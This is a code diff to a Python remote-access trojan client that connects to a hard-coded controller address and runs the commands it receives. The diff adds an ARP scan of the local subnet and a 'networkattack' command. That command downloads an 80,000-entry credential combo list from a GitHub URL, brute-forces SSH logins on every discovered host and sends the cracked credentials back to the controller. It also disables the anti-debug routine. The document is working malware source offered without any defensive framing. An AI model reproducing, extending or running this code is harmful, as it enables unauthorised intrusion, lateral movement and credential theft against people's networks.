@@ -24,12 +24,14 @@ import psutil
 import ctypes
 import shutil
 import signal
+import paramiko
 import platform
 import win32api
 import requests
 import subprocess
 import win32process
 
+from scapy.all import ARP, Ether, srp
 from datetime import datetime
 from threading import Thread
 from typing import Tuple
@@ -37,8 +39,8 @@ from time import sleep
 from ctypes import *
 
 
-IP   = "IP_HERE"
-PORT = int("PORT_HERE")
+IP   = "192.168.0.2"
+PORT = int("1888")
 
 
 class AntiDebug():
@@ -371,6 +373,115 @@ class Client():
         if len(output) == 0: output = b"No Output"
         self.sock.send(output)
 
+    def network_scan(self):
+        ''' Scan network for open ports '''
+
+        def scan(ip):
+            arp_request = ARP(pdst=ip)
+            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+            arp_request_broadcast = broadcast/arp_request
+            answerred, _ = srp(arp_request_broadcast, timeout=1, verbose=0)
+            
+            clients = []
+            for element in answerred:
+                clients.append({
+                    "ip": element[1].psrc,
+                    "mac": element[1].hwsrc,
+            })
+            return clients
+
+        def output_results(clients):
+            out = "\n\n\t ------- Network Scan Results -------\n\n"
+            for client in clients: out += f"\t{client['ip']} \t\t{client['mac']}\n"
+            return out
+
+        results = scan("192.168.0.1/24")
+        output  = output_results(results)
+        self.sock.send(str.encode(output))
+
+    def network_attack(self):
+        ''' Network attack '''
+        usernames = []
+        passwords = []
+        total     = 0
+        
+        connected = []
+
+
+        def load_combos():
+            ''' Load combos '''
+            global usernames, passwords, total
+            list = requests.get("https://raw.githubusercontent.com/Callumgm/dump/main/Beans/80k%20combos").text
+            for line in list.splitlines():
+                try: 
+                    username, password = line.split(":")
+                    usernames.append(username)
+                    passwords.append(password)
+                    total += 1
+                except: continue
+            
+        def connect(host:str, username:str, password:str):
+            """
+            Try and connect to host via SSH.
+            If connection is successful, attempt to brute force login.
+            Parameters
+            ----------
+            host : str
+                Generated IP address to attempt to connect to.
+            Returns
+            -------
+            None
+            """
+            global usernames, passwords, total, connected
+            
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
+            try:
+                # connect to host with username and password
+                client.connect(host, 22, username, password, timeout=5)
+
+                # if we get here, we have cracked the bot
+                connected.append(host + " | " + username + ":" + password)
+                    
+            except socket.error: 
+                pass
+            except paramiko.ssh_exception.AuthenticationException: 
+                pass
+            except paramiko.ssh_exception.SSHException: 
+                pass
+
+        load_combos()
+
+        def scan(ip):
+            arp_request = ARP(pdst=ip)
+            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+            arp_request_broadcast = broadcast/arp_request
+            answerred, _ = srp(arp_request_broadcast, timeout=1, verbose=0)
+            
+            clients = []
+            for element in answerred:
+                clients.append({
+                    "ip": element[1].psrc,
+                    "mac": element[1].hwsrc,
+            })
+            return clients
+
+        def output_results(clients):
+            c = []
+            for client in clients: c.append(client['ip'])
+            return c
+
+        results = scan("192.168.0.1/24")
+        for client in output_results(results):
+            for i in range(total):
+                connect(client, usernames[i], passwords[i])
+
+        if connected != []:
+            self.sock.send(str.encode(str(connected)))
+        else:
+            self.sock.send(str.encode("Unable to crack network"))
+
     def start(self):
         while True:
             data = self._recv()
@@ -422,6 +533,17 @@ class Client():
                     self.sock.send(str.encode(data))
                 except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))
  
+            elif data == "networkscan":
+                try: 
+                    self.network_scan()
+                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))
+ 
+            elif data == "networkattack":
+                try: self.network_attack()
+                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))
+
+
+
             else: self.sock.send(str.encode("Invalid Command"))
 
 
@@ -429,5 +551,5 @@ if __name__ == "__main__":
     try: requests.get('https://google.com')
     except: os._exit(1)
 
-    AntiDebug().start()
+    # AntiDebug().start()
     Client()
